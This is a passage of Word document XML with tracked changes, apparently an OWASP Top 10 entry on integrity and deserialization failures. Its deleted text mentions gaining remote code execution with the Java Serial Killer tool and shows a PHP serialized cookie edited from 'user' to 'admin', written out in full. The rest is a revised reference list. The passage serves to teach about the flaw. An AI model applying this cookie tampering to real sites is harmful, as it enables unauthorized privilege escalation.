          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>uses the Java Serial Killer tool to gain remote code execution on the</w:t>
      </w:r>
      <w:del w:id="3051" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="51C71D7B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>application server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EC2D079" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="3052" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="3053" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923176"/>
    </w:p>
    <w:p w14:paraId="72C49529" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="3054" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="3055" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## References</w:t>
        </w:r>
      </w:moveTo>
    </w:p>
    <w:moveToRangeEnd w:id="3053"/>
    <w:p w14:paraId="1E696FF9" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3056" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3057" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>**Scenario #2**: A PHP forum uses PHP object serialization to save a "super" cookie, containing the user's user ID, role, password hash, and other state:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="4DF95AAE" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3058" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3059" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>`a:4:{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}`</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="72189A07" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3060" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3061" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>An attacker changes the serialized object to give themselves admin privileges:</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="34D9F00F" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3062" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3063" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>`a:4:{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}`</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="27DB507C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="3064" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFromRangeStart w:id="3065" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923175"/>
    </w:p>
    <w:p w14:paraId="23AB6124" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveFrom w:id="3066" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveFrom w:id="3067" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## References</w:t>
        </w:r>
      </w:moveFrom>
    </w:p>
    <w:moveFromRangeEnd w:id="3065"/>
    <w:p w14:paraId="00BA6F7C" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3068" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3069" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### OWASP</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="7A9B329D" w14:textId="0B538D84" w:rsidR="00B74248" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3070" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3071" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="2EF1A074" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3072" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3073" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="004107D9">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>\</w:t>
        </w:r>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>[</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">OWASP Cheat Sheet: Software Supply Chain Security\](Coming Soon)  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="06A55FE1" w14:textId="1F68AD8A" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3074" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3075" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-  </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>\[</w:t>
        </w:r>
      </w:ins>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">OWASP Cheat Sheet: </w:t>
      </w:r>
      <w:del w:id="3076" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>Deserialization</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3077" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Secure build and deployment\](Coming Soon) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="115BF722" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3078" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:ins w:id="3079" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-  [</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>OWASP Cheat Sheet: Infrastructure as Code</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>](https://</w:t>
      </w:r>
      <w:ins w:id="3080" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>cheatsheetseries.owasp.org/cheatsheets/Infrastructure_as_Code_Security_Cheat_Sheet.html)  -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="10249644" w14:textId="0DD64909" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3081" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [OWASP Cheat Sheet: </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Deserialization](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> &lt;https://</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>www.owasp.org/index.php/Deserialization_Cheat_Sheet</w:t>
      </w:r>
      <w:del w:id="3082" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3083" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">&gt;)  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="66A56A0B" w14:textId="0EA45D50" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3084" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3085" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP Proactive</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3086" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>SAFECode</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> Software Integrity</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Controls</w:t>
      </w:r>
      <w:del w:id="3087" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>: Validate All Inputs](</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3088" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">]( https://safecode.org/publication/SAFECode_Software_Integrity_Controls0610.pdf)  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="72E222CD" w14:textId="529C8FB7" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3089" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [A 'Worst Nightmare' Cyberattack: The Untold Story Of The SolarWinds </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Hack](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>&lt;</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>https://www.</w:t>
      </w:r>
      <w:del w:id="3090" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>owasp.org/index.php/OWASP_Proactive_Controls#4:_Validate_All_Inputs)</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3091" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>npr.org/2021/04/16/985439655/a-worst-nightmare-cyberattack-the-untold-story-of-the-solarwinds-hack&gt;) -</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="5B424E86" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3092" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3093" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:delText>* [OWASP Application Security Verification Standard: TBA](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project#tab=Home)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="19CB4BDD" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3094" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3095" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP AppSecEU 2016: Surviving the Java Deserialization Apocalypse](https://speakerdeck.com/pwntester/surviving-the-java-deserialization-apocalypse)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="272A2751" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3096" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3097" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>* [OWASP AppSecUSA 2017: Friday the 13th JSON Attacks](https://speakerdeck.com/pwntester/friday-the-13th-json-attacks)</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="17331396" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3098" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D832E12" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="3099" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3100" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>### External</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="685E0782" w14:textId="4C8B3471" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3101" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="3102" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>*</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3103" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>- [</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>CodeCov</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve"> Bash Uploader </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Compromise](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidR="00841D1E" w:rsidRPr="00841D1E">
          <w:rPr>
